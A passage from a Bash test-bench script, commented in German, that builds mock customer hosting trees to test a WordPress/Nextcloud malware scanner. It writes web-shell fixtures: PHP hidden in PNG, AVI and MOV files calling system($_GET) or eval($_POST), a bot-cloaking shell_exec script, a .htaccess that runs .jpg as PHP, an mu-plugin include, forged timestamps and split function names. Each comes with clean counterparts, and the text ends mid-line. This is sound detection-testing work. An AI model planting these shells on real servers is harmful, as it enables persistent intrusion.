  # 274 harmlose Dateien anklagt, wird im Ganzen nicht mehr gelesen.
  #
  # NT_PRUEFSTAND_OHNE_WAECHTER=1 legt an dieselben Stellen echte PHP-Dateien.
  # Dann MUSS der Vergleich ausschlagen — sonst filtert der Waechter-Zweig
  # nicht mehr nur Waechter, sondern deckt Funde zu.
  mkdir -p "${k2}/wp-content/uploads/forminator" "${k2}/wp-content/uploads/cache"
  if [[ "${NT_PRUEFSTAND_OHNE_WAECHTER:-0}" != "1" ]]; then
    # Bewusst drei verschiedene Faelle, damit jeder Zweig einzeln getragen wird:
    : > "${k2}/wp-content/uploads/index.php"                            # leer → Groessen-Zweig
    printf '<?php exit;\n' > "${k2}/wp-content/uploads/forminator/index.php"  # → Pfadmuster
    printf '<?php exit;\n' > "${k2}/wp-content/uploads/cache/index.php"       # → Pfadmuster
  else
    printf '<?php eval($_POST["a"]);\n' > "${k2}/wp-content/uploads/index.php"
    printf '<?php eval($_POST["b"]);\n' > "${k2}/wp-content/uploads/forminator/index.php"
    printf '<?php eval($_POST["c"]);\n' > "${k2}/wp-content/uploads/cache/index.php"
  fi
  # Als Nicht-PHP getarnte Nutzlast.
  printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
    > "${k2}/wp-content/uploads/2026/03/logo.png"

  # ── Ein Massenvorgang fuer 13e.1 (#65) ───────────────────────────────
  #
  # Am 13.08.2026 standen ueber 200 Dateien vom 19.02.2026 innerhalb von
  # 41 Sekunden am Anfang der Zeitachse — eine Wiederherstellung. 13e.1 zaehlte
  # sie als ersten Schreibvorgang, und 13e.4 datierte darauf.
  #
  # Fuenf getarnte Nutzlasten, die im selben Zug zurueckgespielt wurden: sie
  # sind Befund (7.13 findet sie), tragen aber alle die ALTE mtime und eine
  # gemeinsame, neue ctime. Genau daran erkennt 13e.1 den Vorgang.
  #
  # NT_PRUEFSTAND_OHNE_MASSENVORGANG=1 gibt ihnen stattdessen eine frische
  # mtime. Dann sind es fuenf Anker statt fuenf Kopien — dieselbe Menge,
  # dieselbe Sekunde, andere Einordnung. Die Gegenprobe prueft damit den
  # UNTERSCHEIDER und nicht bloss, ob die Dateien da sind.
  local wh="${k2}/wp-content/uploads/2026/03/wiederherstellung"
  mkdir -p "$wh"
  local i
  for i in 1 2 3 4 5; do
    printf '\x89PNG\r\n\x1a\n<?php system($_GET["r%s"]); ?>\n' "$i" > "${wh}/bild${i}.png"
  done
  # ── robots.txt: vergiftet und legitim ────────────────────────────────
  # Kunde 2 traegt die Kampagnen-Fassung aus dem echten Befall: die Sitemap
  # zeigt ueber index.php/ auf einen Pfad, zu dem es keine Datei gibt — der
  # Generator sitzt in der Datenbank.
  #
  # Kunde 3 ist die GEGENPROBE und der eigentliche Test: eine voellig normale
  # robots.txt mit der virtuellen Sitemap, die WordPress seit 5.5 selbst
  # ausliefert. Schlaegt die Regel dort an, meldet sie jede gepflegte Seite —
  # dann ist sie wertlos.
  printf 'User-agent: *\nDisallow: /wp-admin/\nSitemap: https://kunde-zwei.example/index.php/sitemap.xml\n' \
    > "${k2}/robots.txt"
  # Bewegtbild-Endungen — die Luecke aus dem echten Befall vom 12.08.2026.
  #
  # Dort lagen 32 getarnte Nutzlasten, 7.13 fand 17. Die fehlenden 15 hiessen
  # .avi (7), .mov (5), .wmv (4), .mpg, .mpeg: die Endungsliste kannte von den
  # Videoformaten nur .mp4. Der Pruefbaum kannte die Luecke ebenfalls nicht —
  # er hatte nur .png.
  #
  # Ohne Verdachtsmerkmal im Code, wie bei der PNG-Probe weiter unten: gesucht
  # ist der BEHAELTER, nicht was das PHP tut.
  printf 'RIFF\x00\x00\x00\x00AVI <?php $u="https://beispiel.invalid/n.php"; ?>\n' \
    > "${k2}/wp-content/uploads/2026/03/clip.avi"
  printf '\x00\x00\x00\x14ftypqt  <?php $u="https://beispiel.invalid/n.php"; ?>\n' \
    > "${k2}/wp-content/uploads/2026/03/clip.mov"
  # Zweite getarnte Nutzlast — bewusst OHNE jedes Verdachtsmerkmal.
  #
  # Die Probe darueber enthaelt system($_GET[…]) und schlaegt damit auch bei
  # den Musterpruefungen an. Sie taugt deshalb nicht, um 7.13 zu pruefen: man
  # koennte den Abschnitt entfernen, und der Pruefstand bliebe stumm.
  #
  # Diese hier hat kein eval, kein base64, keine Superglobale, keine Funktion
  # aus einer Verdachtsliste. Auf Token-Ebene harmloser Code — genau wie der
  # Dropper des Anlassfalls, den weder Signaturscanner noch Heuristik noch ein
  # fremder YARA-Regelsatz meldeten. Erkennbar ist allein der Behaelter: ein
  # Bild, in dem PHP steht. Faellt 7.13 weg, faellt dieser Fund weg.
  #
  # NT_PRUEFSTAND_OHNE_MEDIENPROBE=1 laesst diese Probe weg. Damit prueft die
  # CI, ob 7.13 den Fund ueberhaupt traegt: ohne die Probe muss der Vergleich
  # gegen die Referenz ausschlagen. Tut er das nicht, ist der Abschnitt blind
  # und der Pruefstand behauptet eine Abdeckung, die es nicht gibt.
  mkdir -p "${k2}/wp-content/plugins/beispiel-plugin/assets"
  if [[ "${NT_PRUEFSTAND_OHNE_MEDIENPROBE:-0}" != "1" ]]; then
    printf '\x89PNG\r\n\x1a\n<?php $u="https://beispiel.invalid/n.php";$c=curl_init();curl_setopt($c,CURLOPT_URL,$u);$d=curl_exec($c);curl_close($c);\n' \
      > "${k2}/wp-content/plugins/beispiel-plugin/assets/banner.png"
  else
    # Gleiche Datei, gleicher Name, aber ein echtes Bild ohne PHP.
    printf '\x89PNG\r\n\x1a\nIHDR-nur-Bilddaten-kein-PHP\n' \
      > "${k2}/wp-content/plugins/beispiel-plugin/assets/banner.png"
  fi
  # Gefaehrliche Funktionen OHNE Obfuskation, in einer kleinen Datei.
  #
  # Faellt durch PATTERN_REGEX: kein eval, kein base64, kein Aufruf aus einer
  # Superglobalen. Der Anlassfall war eine Filemanager-Shell, die shell_exec
  # voellig offen nutzte und deshalb unsichtbar blieb. Erkennbar erst ueber
  # PATTERN_REGEX_MED, und nur weil die Datei klein ist — dieselben Aufrufe in
  # einem Framework sind alltaeglich.
  if [[ "${NT_PRUEFSTAND_OHNE_FUNKTIONSPROBE:-0}" != "1" ]]; then
    cat > "${k2}/wp-content/uploads/2026/03/hilfe.php" <<'PHP'
<?php
$bots = ['Googlebot', 'bingbot', 'curl'];
if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
echo shell_exec('id');
PHP
  else
    printf '<?php\n// harmlos\n' > "${k2}/wp-content/uploads/2026/03/hilfe.php"
  fi

  # Massenhaft gleiche Zeitstempel — Spurenverwischung.
  #
  # Im Anlassfall trugen 59.472 Dateien dieselbe gefaelschte mtime. Hier reicht
  # knapp ueber der Schwelle. Fester Zeitpunkt, damit der Vergleich
  # deterministisch bleibt; er entspricht dem Datum des Anlassfalls.
  local zc="${k2}/wp-content/cache"
  mkdir -p "$zc"
  if [[ "${NT_PRUEFSTAND_OHNE_ZEITCLUSTER:-0}" != "1" ]]; then
    local i
    for i in $(seq 1 520); do : > "${zc}/eintrag-${i}.dat"; done
    touch -t 202311200232.19 "${zc}"/eintrag-*.dat 2>/dev/null || true
  fi

  # mu-Plugin: laeuft ohne Aktivierung.
  printf '<?php @include base64_decode("L3RtcC94");\n' \
    > "${k2}/wp-content/mu-plugins/cache.php"

  # ── Zeitstempel-Deutung fuer 13e.2 (#48) ─────────────────────────────
  # Ohne diese beiden Stempel traegt der Pruefstand nur ANKER-Faelle (mtime ==
  # ctime), weil er alles in derselben Sekunde schreibt — 13e.2 waere damit
  # ungeprueft.
  #
  # Die ctime laesst sich NICHT setzen; das ist der Grund, warum der Abschnitt
  # sie benutzt. Ein Wellenabstand ist im Pruefstand deshalb nicht baubar (er
  # braeuchte echte ctime-Luecken) — die beiden Deutungen, die am Verhaeltnis
  # von mtime zu ctime haengen, dagegen schon: `touch -t` setzt die mtime und
  # zieht die ctime auf jetzt.
  #
  #   rueckdatiert → ctime weit nach mtime  → INODE
  #     Das ist der wp-config.php-Fall des Anlassfalls: `cp -p` der eigenen
  #     Gegenmassnahme nahm die alte mtime mit. Ohne diese Deutung sieht die
  #     eigene Rotation wie ein zweiter Einbruch aus.
  #   vorwaerts    → mtime NACH ctime       → ZUKUNFT
  #     Normal unmoeglich, jedes Setzen der mtime zieht die ctime mit. Wer das
  #     tut, will aus jeder nach Datum sortierten Sichtung verschwinden.
  # Die beiden Stempel setzt die Zeitfolge am Ende von baum_bauen — dort, wo
  # auch die ctime-Reihenfolge entsteht. Wuerden sie hier stehen, liefe ihre
  # ctime der Folge davon.
  #
  # NT_PRUEFSTAND_OHNE_ZEITDEUTUNG=1 laesst sie weg: 13e.2 sieht dann nur noch
  # ANKER und meldet weder INODE noch ZUKUNFT — die Gegenprobe muss ausschlagen.
  # .htaccess mit Freigabeliste — sperrt PHP und gibt genau die eigene Datei frei.
  # NT_PRUEFSTAND_OHNE_HTACCESSPROBE=1 legt stattdessen eine harmlose Datei ab.
  if [[ "${NT_PRUEFSTAND_OHNE_HTACCESSPROBE:-0}" != "1" ]]; then
  cat > "${k2}/wp-content/uploads/.htaccess" <<'HTA'
Order allow,deny
<Files "bild.php">
  Allow from all
</Files>
HTA
  else
    printf "Options -Indexes\n" > "${k2}/wp-content/uploads/.htaccess"
  fi

  local k2j="${W}/kunde-zwei.example/joomla.kunde-zwei.example"
  mkdir -p "${k2j}/administrator" "${k2j}/libraries/src"
  cat > "${k2j}/configuration.php" <<'PHP'
<?php
class JConfig {
  public $db = 'k2_joomla';
  public $user = 'k2_joomla';
  public $password = 'nicht-echt-nur-pruefstand';
  public $host = 'localhost';
  public $dbprefix = 'jos_';
  public $error_reporting = 'maximum';
}
PHP
  printf '<?php\ndefine("JVERSION","4.4.2");\n' > "${k2j}/libraries/src/Version.php"

  local k2n="${W}/kunde-zwei.example/cloud.kunde-zwei.example"
  mkdir -p "${k2n}/apps/files" "${k2n}/config" "${k2n}/data"
  printf '#!/usr/bin/env php\n<?php // occ\n' > "${k2n}/occ"; chmod +x "${k2n}/occ"
  printf '<?php $OC_Version = array(28,0,1,2);\n' > "${k2n}/version.php"
  printf '<?php $CONFIG = array("datadirectory" => "%s/data");\n' "$k2n" \
    > "${k2n}/config/config.php"
  # Manipulierte Root-.htaccess — WordPress-Freigabeliste in einer Nextcloud.
  cat > "${k2n}/.htaccess" <<'HTA'
Order allow,deny
<Files "filefuns.php">
  Allow from all
</Files>
HTA
  printf '<?php // dropper\n' > "${k2n}/filefuns.php"
  # Verschachtelung, wie sie die Kampagne hinterlaesst.
  mkdir -p "${k2n}/config/config"
  printf '<?php // nested\n' > "${k2n}/config/config/index.php"

  # Eine .htaccess mit ECHTEN Eigenregeln neben dem Schadcode. Ohne sie
  # prueft der Abschnitt nur, ob er Angreifer findet — nicht, ob er die Regeln
  # des Betreibers stehen laesst. Genau daran entscheidet sich, ob eine
  # spaetere Erneuerung die Website heil laesst.
  cat > "${k2}/.htaccess" <<'HTA'
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteRule . /index.php [L]
</IfModule>
# END WordPress

# BEGIN YOAST REDIRECTS
Redirect 301 /alte-seite /neue-seite
# END YOAST REDIRECTS

Redirect 301 /shop https://shop.kunde-zwei.example/
Header always set Strict-Transport-Security "max-age=31536000"
AddType application/font-woff2 .woff2
<Files "wp-config.php">
  Require all denied
</Files>

# Angreiferzeilen darunter
AddType application/x-httpd-php .jpg
php_value auto_prepend_file /var/www/vhosts/kunde-zwei.example/httpdocs/wp-content/uploads/2026/03/bild.php
HTA

  # Und eine mit Wordfence — die darf NICHT als Angriff gemeldet werden.
  local k1h="${W}/kunde-eins.example/httpdocs"
  cat > "${k1h}/.htaccess" <<'HTA'
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule . /index.php [L]
</IfModule>
# END WordPress
php_value auto_prepend_file '/var/www/vhosts/kunde-eins.example/httpdocs/wordfence-waf.php'
Redirect 301 /impressum /rechtliches
HTA

  # ── Kunde 3: sauber, dient als Gegenprobe ───────────────────
  local k3="${W}/kunde-drei.example/httpdocs"
  mkdir -p "${k3}/wp-content/uploads" "${k3}/wp-admin"
  cat > "${k3}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k3_wp');
define('DB_USER', 'k3_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP

  printf '<?php\n// wp-load\n' > "${k3}/wp-load.php"

  # ── Kunde 4: Kern NICHT pruefbar ────────────────────────────
  # Die Attrappe antwortet fuer diesen Pfad gar nicht — wie wp-cli, wenn es
  # abbricht: kein Speicher, kein Netz zum Pruefsummendienst, vom Hoster
  # abgeschossen.
  #
  # Der Fall traegt BEIDE Haelften des Schadens, und nur zusammen zeigen sie
  # ihn:
  #
  #   a) das Urteil ueber den Kern muss ⚪ sein, nicht ✅. Eine Pruefung, die
  #      nicht geantwortet hat, bestaetigt nichts.
  #   b) class-pruefstand-sanitize.php liegt hier genauso unter wp-includes/
  #      wie bei Kunde 3 — aber ohne Whitelist-Eintrag entlastet 13c sie
  #      NICHT, sie bleibt 🔴.
  #
  # Vorher meldete derselbe Lauf "Kern unveraendert" UND fuehrte eine
  # Kern-Datei als Fund. Beides aus derselben Wurzel, beides plausibel.
  # Nach der Korrektur widerspricht sich der Bericht nicht mehr: er sagt,
  # dass er es nicht weiss.
  local k4="${W}/kunde-vier.example/httpdocs"
  mkdir -p "${k4}/wp-content/uploads" "${k4}/wp-admin" "${k4}/wp-includes"
  cat > "${k4}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k4_wp');
define('DB_USER', 'k4_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP
  printf '<?php\n// wp-load\n' > "${k4}/wp-load.php"

  # ════════════════════════════════════════════════════════════
  # ABGLEICH GEGEN DIE ECHTEN LAGEN — Stand 2026-08-12
  # ════════════════════════════════════════════════════════════
  #
  # An einem Tag fanden zwei Laeufe gegen EINE echte Installation fuenf
  # Fehler, die 46 Selbsttestfaelle, ein deckungsgleiches Goldmuster und vier
  # Pruefstaende nicht sehen konnten. Vier davon hatten dieselbe Ursache:
  # der Pruefbaum kannte eine Form nicht, die es in der Wirklichkeit gibt.
  # Der fuenfte war schlimmer — die wp-cli-Attrappe war an den Defekt
  # ANGEPASST worden (siehe 'core version' weiter oben).
  #
  # Deshalb hier die Liste der Formen, die auf dem gemessenen System
  # vorkamen, und was der Pruefbaum davon abdeckt. Wer eine Form ergaenzt,
  # traegt sie hier nach.
  #
  #   Form                                        Vorbild        abgedeckt
  #   ------------------------------------------- -------------- ---------
  #   Plugin mit Kopf und Fassung                 15 von 17      ja
  #   Plugin ohne lesbaren Kopf, PHP oben         —              ja (kopflos)
  #   Verzeichnis ohne JEDE PHP-Datei             chronosly-     ja, Regel #39
  #                                               addons
  #   Verzeichnis mit PHP NUR in Unterordnern,    chronosly-     ja, Regel #39
  #   ohne Kopf                                   templates
  #   .php-Datei mit reinem JSON, eine Riesen-    dad7/          ja
  #   zeile                                       default.php
  #   Schwachstellenzeile ohne 'behoben'          26 % des       ja (#38)
  #                                               Bestandes
  #   Schwachstellenzeile ohne 'kev'              99,7 %         ja
  #   Bereich '* … *', trifft jede Fassung        WP-Core        ja (#38)
  #   wp-cli antwortet nicht ohne --path          jede Instanz   ja (#41)
  #
  # NOCH NICHT ABGEDECKT — jeweils mit offenem Issue:
  #
  #   Pruefsummensatz fuehrt Datei, die fehlt      2 Dateien      #40
  #   veraenderte Nicht-Codedatei (readme, .po)    —              #40
  #   UNVERAENDERTE Core-Datei mit Mustertreffer   1 Datei        #42
  #
  # Die drei gehoeren mit der jeweiligen Reparatur dazu, nicht vorher: eine
  # Fixture fuer #42 wuerde sonst den Fehlalarm als Sollwert einfrieren.
  #
  # WAS DIESER BAUM GRUNDSAETZLICH NICHT LEISTET
  #
  # Ein Rauschmass. Auf dem echten System listete §7.15 235 Dateien ueber der
  # Schwelle — 222 davon mit genau 3 Punkten, also exakt auf INJEKTION_
  # PUNKTE_MIN. Hier sind es eine Handvoll. Der Pruefbaum kann pruefen, DASS
  # der Detektor trennt; wo die Schwelle liegen muss, kann nur eine Messung
  # an einem echten Server sagen (#9).
  #
  # ── Erweiterungen fuer den Versionsabgleich ─────────────────
  # Ohne Plugins im Baum konnte der Pruefstand den Trefferpfad von
  # rezept_version nie ueben: er sah nur den Fall "nichts zu vergleichen".
  #
  # Die Kennungen sind FREI ERFUNDEN und die CVE-Nummern synthetisch. Ein
  # Pruefbaum darf keine Tatsachenbehauptung ueber ein echtes Plugin
  # enthalten — weder hier noch im dazugehoerigen Bestand in
  # wp_datenbestand_bauen.
  #
  # Kunde 2 traegt die verwundbaren Fassungen, Kunde 3 die aktuellen. Damit
  # deckt derselbe Baum beide Richtungen ab: Treffer und Gegenprobe.
  wp_plugin() {   # wp_plugin <installation> <slug> <fassung|-> <anzeigename>
    local ziel="$1/wp-content/plugins/$2"
    mkdir -p "$ziel"
    { printf '<?php\n/*\nPlugin Name: %s\n' "$4"
      [[ "$3" != "-" ]] && printf 'Version: %s\n' "$3"
      printf '*/\n// Pruefstand, ohne Funktion\n'
    } > "${ziel}/$2.php"
    # Fuenf Bibliotheksdateien je Plugin. Sie tragen nichts zur Erkennung bei,
    # sind aber der Gegenstand von #18: der fremde Regelsatz schlaegt auf genau
    # solchen Dateien an (pclzip, UpdraftPlus, Wordfence im Messlauf), und die
    # lebende Pruefsummen-Whitelist muss sie herausnehmen. Ohne mehrere davon
    # laege der eingebaute Schadcode ohnehin weit oben und der Filter waere
    # nicht messbar.
    local i
    mkdir -p "${ziel}/lib"
    for i in a b c d e; do
      printf '<?php\n// Bibliothek %s von %s, Pruefstand\n' "$i" "$2" > "${ziel}/lib/${i}.php"
    done

    # ── Zwei GROSSE Dateien fuer Abschnitt 7.15 ──────────────────────────
    # Der Pruefgegenstand ist die Injektion in eine grosse, legitime Datei —
    # der Fall, den die Groessenregel aus 7.3 nicht fasst und fuer den es bei
    # kommerziellen Plugins keine Pruefsumme gibt.
    #
    # ZWEI Dateien, weil eine nichts beweist. Die saubere ist der eigentliche
    # Test: schlaegt das Mass auch dort an, ist es wertlos. Beide haben
    # dieselbe Groesse und dieselbe Machart und unterscheiden sich NUR um die
    # angehaengte Nutzlast.
    {
      printf '<?php\n// %s — grosse Klasse, Pruefstand\nclass %s_Gross {\n' "$2" "$2"
      for i in $(seq 1 400); do
        printf '    public function methode_%s($wert) {\n        return trim($wert) . %s;\n    }\n' \
               "$i" "'_${i}'"
      done
      printf '}\n'
    } > "${ziel}/gross-sauber.php"
    cp "${ziel}/gross-sauber.php" "${ziel}/gross-injiziert.php"
    # NT_PRUEFSTAND_OHNE_INJEKTION=1 laesst die Nutzlast weg. Der Vergleich
    # MUSS das bemerken — sonst erreicht der Pruefstand 7.15 gar nicht.
    if [[ "${NT_PRUEFSTAND_OHNE_INJEKTION:-0}" != "1" ]]; then
      {
        printf '?>\n<?php $k='
        printf "'"
        for i in $(seq 1 120); do printf '\\x%02x' $(( 65 + i % 26 )); done
        printf "';"
        printf ' @eval($_POST[%s]); ?>\n' "'c'"
      } >> "${ziel}/gross-injiziert.php"
    fi
  }
  wp_theme() {    # wp_theme <installation> <slug> <fassung> <anzeigename>
    local ziel="$1/wp-content/themes/$2"
    mkdir -p "$ziel"
    printf '/*\nTheme Name: %s\nVersion: %s\n*/\n' "$4" "$3" > "${ziel}/style.css"
  }

  # ── Was unter plugins/ liegt und KEIN Plugin ist ─────────────────────
  #
  # Abgenommen vom ersten Lauf gegen ein echtes System (#9). Dort lagen unter
  # wp-content/plugins/ zwei Verzeichnisse, die WordPress selbst in keiner
  # Pluginliste fuehrt, weil ihnen der Kopf fehlt — Chronosly legt daneben
  # seine Daten und Vorlagen ab:
  #
  #   chronosly-addons     0 PHP-Dateien ueberhaupt, nur eine version.json
  #   chronosly-templates  0 PHP-Dateien oben, 12 in Unterordnern, kein Kopf
  #
  # Der Prüfbaum kannte nur 'pruefstand-kopflos': PHP OBEN, aber ohne Kopf.
  # Die beiden echten Formen fehlten, und deshalb blieb unbemerkt, dass
  # _wp_bestand jedes Verzeichnis unter plugins/ als Plugin zaehlt und beide
  # als "ohne lesbare Fassung" meldet — der ⚪-Anteil faellt dadurch zu hoch
  # aus.
  #
  # Seit #39 haelt die Referenz das RICHTIGE Verhalten fest: beide
  # Verzeichnisse fallen aus der Angreifbarkeitsbilanz heraus und bekommen
  # eigene, sichtbare Zeilen. Der Vergleich hat die Reparatur belegt —
  # 5 → 2 nicht bewertbare Bestandteile, 4 → 1 Plugin ohne Pruefsummensatz.
  #
  # NT_PRUEFSTAND_OHNE_NICHTPLUGIN=1 gibt beiden einen ordentlichen
  # Plugin-Kopf. Damit sind es echte Plugins, die neuen Zeilen verschwinden,
  # und sie zaehlen wieder in der Bilanz mit. Die Gegenprobe prueft also das
  # KRITERIUM (Kopf vorhanden?) und nicht bloss, ob die Fixture da ist.
  wp_nichtplugin() {   # wp_nichtplugin <installation>
    local basis="$1/wp-content/plugins"
    local _kopf="${NT_PRUEFSTAND_OHNE_NICHTPLUGIN:-0}"
    # a) gar keine PHP-Datei, nur eine lesbare Fassungsangabe im JSON
    mkdir -p "${basis}/pruefstand-daten"
    printf '{"version":"2.4.0","name":"Pruefstand Daten"}\n' \
      > "${basis}/pruefstand-daten/version.json"
    if [[ "$_kopf" == "1" ]]; then
      printf '<?php\n/*\nPlugin Name: Pruefstand Daten\nVersion: 2.4.0\n*/\n' \
        > "${basis}/pruefstand-daten/pruefstand-daten.php"
    fi
    # b) PHP nur in Unterordnern, und der Inhalt ist reines JSON auf EINER
    #    Zeile. Genau die Machart der echten Vorlagendateien — und damit auch
    #    das Rauschmaterial, an dem sich §7.15 bewaehren muss: lange Zeile,
    #    hohe Dichte, kein Schadcode.
    local i
    for i in 1 2; do
      mkdir -p "${basis}/pruefstand-vorlagen/dad${i}"
      {
        printf '{"boxes":[{"type":"%s","style":"width:23.5%%;clear:none;float:left;"' "$i"
        local j
        for j in $(seq 1 40); do
          printf ',{"name":"feld_%s","value":"","label":"Feld %s"}' "$j" "$j"
        done
        printf ']}\n'
      } > "${basis}/pruefstand-vorlagen/dad${i}/default.php"
    done
    if [[ "$_kopf" == "1" ]]; then
      printf '<?php\n/*\nPlugin Name: Pruefstand Vorlagen\nVersion: 1.0.0\n*/\n' \
        > "${basis}/pruefstand-vorlagen/pruefstand-vorlagen.php"
    fi
  }

  # Kunde 2: eine Luecke mit belegter Ausnutzung (🔴), eine ohne (⚠️), eine
  # Fassung ausserhalb des Bereichs (✅) und eine ohne lesbaren Kopf (⚪).
  wp_kern() {   # wp_kern <installation> <fassung>
    mkdir -p "$1/wp-includes"
    printf '<?php\n$wp_version = %s;\n' "'$2'" > "$1/wp-includes/version.php"
  }
  wp_kern "$k2" 6.4.1
  wp_plugin "$k2" pruefstand-kev      1.2   "Pruefstand KEV"
  # Nicht-Codedatei fuer den SOFT-Fall (#40): pruefsummen_bauen verfaelscht
  # ihre Pruefsumme im Satz, der Vergleich stuft sie als SOFT ein (keine
  # Code-Endung) — und der Beleg muss ihren Pfad nennen. Bis #40 kannte der
  # Pruefbaum weder diese Lage noch den FEHLT-Fall; beide gab es auf dem
  # echten System (#9, Messpunkt 3), und der Bericht nannte nur eine Zahl.
  printf 'Pruefstand KEV — readme\n' > "${k2}/wp-content/plugins/pruefstand-kev/readme.txt"
  wp_plugin "$k2" pruefstand-alt      2.0.3 "Pruefstand Alt"
  # 4.1 statt 4.0: der Pruefsummensatz liegt je Slug UND Fassung. Haetten beide
  # Kunden dieselbe Fassung, traefe die absichtliche Verfaelschung fuer Kunde 2
  # auch Kunde 3 — und die Gegenprobe waere keine mehr.
  wp_plugin "$k2" pruefstand-aktuell  4.1   "Pruefstand Aktuell"
  wp_plugin "$k2" pruefstand-kopflos  -     "Pruefstand Kopflos"
  # Betroffen, aber OHNE behobene Fassung — und ohne KEV-Kennzeichen. Damit hat
  # die Ergebniszeile zwei LEERE MITTELFELDER, und genau das fehlte hier: alle
  # anderen Fixture-Zeilen fuehren in jedem Feld einen Wert.
  #
  # Bash fasst aufeinanderfolgende Tabulatoren zu EINEM Trenner zusammen, auch
  # wenn IFS nur auf Tab steht. Ohne diese Zeile verschob sich im echten Lauf
  # die halbe Meldung, und weder das Goldmuster noch 46 Selbsttestfaelle
  # zeigten etwas. In den echten Daten trifft das 26 % aller Datensaetze.
  wp_plugin "$k2" pruefstand-ohne-fix 1.0   "Pruefstand Ohne Fix"
  # Die beiden Nicht-Plugin-Verzeichnisse aus dem echten Baum (#39).
  wp_nichtplugin "$k2"
  # Composer-Abhaengigkeit eines Plugins (#14). Kunde 2 traegt die verwundbare
  # Fassung, Kunde 3 die behobene — derselbe Baum deckt damit Treffer UND
  # Gegenprobe ab. Die dev-Fassung prueft den dritten Fall: nicht vergleichbar,
  # also UNBEWERTBAR und ausdruecklich nicht "sauber".
  wp_composer() {   # wp_composer <installation> <plugin> <fassung>
    local v="$1/wp-content/plugins/$2/vendor/composer"
    mkdir -p "$v"
    printf '{"packages":[{"name":"pruefstand/bibliothek","version":"v%s"},{"name":"pruefstand/entwicklung","version":"dev-main"}]}\n' "$3" \
      > "${v}/installed.json"
  }
  wp_composer "$k2" pruefstand-kev 1.2.0
  wp_theme  "$k2" pruefstand-thema    0.9   "Pruefstand Thema"

  # Kunde 3 ist die Gegenprobe: alles aktuell, nichts darf gemeldet werden.
  wp_kern "$k3" 6.9.2
  # ── Legitime Haertung: Freigabeliste NUR mit Kern-Einstiegspunkten ──────
  # Die Gegenprobe zu Abschnitt 7.6b (#46). Auf dem echten Server standen 29
  # solcher Dateien — PHP sperren, die Standard-Einstiegspunkte wieder oeffnen.
  # Das ist die verbreitetste Haertung ueberhaupt.
  #
  # Schlaegt die Namensregel hier an, meldet sie jede gehaertete Installation
  # und ist wertlos. Die Dateien existieren absichtlich — es darf ALLEIN am
  # Namen haengen.
  {
    printf 'Order allow,deny\n'
    for _n in index.php wp-login.php xmlrpc.php; do
      printf '<Files "%s">\n  Allow from all\n</Files>\n' "$_n"
    done
  } > "${k3}/.htaccess"
  for _n in index.php wp-login.php xmlrpc.php; do
    printf '<?php // Kern-Einstiegspunkt, Pruefstand\n' > "${k3}/${_n}"
  done
  # Gegenprobe zur vergifteten robots.txt bei Kunde 2 (#47): eine voellig
  # normale, mit der VIRTUELLEN Sitemap, die WordPress seit 5.5 selbst
  # ausliefert. Schlaegt die Regel hier an, meldet sie jede gepflegte Seite.
  printf 'User-agent: *\nDisallow: /wp-admin/\nSitemap: https://kunde-drei.example/wp-sitemap.xml\n' \
    > "${k3}/robots.txt"

  # ── Das Abnahmekriterium fuer Abschnitt 13d ──────────────────────────
  #
  # Abgenommen vom echten Fehlalarm am 12.08.2026: eine UNVERAENDERTE
  # Kern-Datei loeste 7.3 Stufe 1 aus, weil sie klein ist und acht
  # Hex-Escapes enthaelt. Im Original war es
  # wp-includes/class-wp-simplepie-sanitize-kses.php mit der
  # HTML-Whitespace-Zeichenklasse aus der WHATWG-Spezifikation.
  #
  # Zwei Dateien, weil eine nichts beweist:
  #
  #   a) unter dem geprueften Kern von Kunde 3 -> MUSS entlastet werden.
  #      Kunde 3 ist die Gegenprobe: sein Kern besteht verify-checksums.
  #   b) ausserhalb jedes Kerns bei Kunde 2    -> MUSS 🔴 bleiben.
  #
  # Faellt (a) nicht weg, greift die Entlastung nicht. Faellt (b) weg,
  # entlastet der Filter zu viel — und das waere die stille Entwarnung,
  # gegen die dieser ganze Abschnitt gebaut ist.
  _hexkette() {   # acht Hex-Escapes, wie in der echten Zeichenklasse
    printf '\\x09\\x0A\\x0B\\x0C\\x0D\\x20\\x2F\\x3E'
  }
  printf '<?php\n// Pruefstand: sieht aus wie Obfuskation, ist Kern-Code\nif ( preg_match( %s/[^%s]*%s, $d ) ) { return true; }\n' \
         "'" "$(_hexkette)" "'" > "${k3}/wp-includes/class-pruefstand-sanitize.php"
  # c) unter einem Kern, der NICHT geprueft werden konnte (Kunde 4)
  #    -> MUSS 🔴 bleiben. Wer nicht gemessen hat, darf nicht freisprechen.
  printf '<?php\n// Pruefstand: sieht aus wie Obfuskation, Kern ungeprueft\nif ( preg_match( %s/[^%s]*%s, $d ) ) { return true; }\n' \
         "'" "$(_hexkette)" "'" > "${k4}/wp-includes/class-pruefstand-sanitize.php"
  mkdir -p "${k2}/wp-content/uploads/pruefstand"
  printf '<?php\n// Pruefstand: dieselbe Machart, aber ausserhalb jedes Kerns\n$x = "%s"; @eval($_POST[%sc%s]);\n' \
         "$(_hexkette)" "'" "'" > "${k2}/wp-content/uploads/pruefstand/dropper.php"

  # ── Zerlegte Funktionsnamen (7.16) ───────────────────────────────────
  # Die Machart, die auf kundenserver42 fuenf Verfahren ueberstanden hat:
  # der Angreifer schreibt nicht `fopen`, sondern "f"."o"."p"."e"."n".
  #
  # Daneben die GEGENPROBE, und sie ist der eigentliche Test: eine legitime
  # Textverkettung. Eine Regel, die dort anschlaegt, meldet jede zweite
  # Sprachdatei.
  #
  # NT_PRUEFSTAND_OHNE_ZERLEGT=1 schreibt den Funktionsnamen aus — dann darf
  # es keinen Treffer mehr geben.
  mkdir -p "${k2}/wp-content/uploads/pruefstand"
  if [[ "${NT_PRUEFSTAND_OHNE_ZERLEGT:-0}" != "1" ]]; then
    printf '<?php\n$o="f"."o"."p"."e"."n"; $h=$o($_GET["d"],"w");\n' \
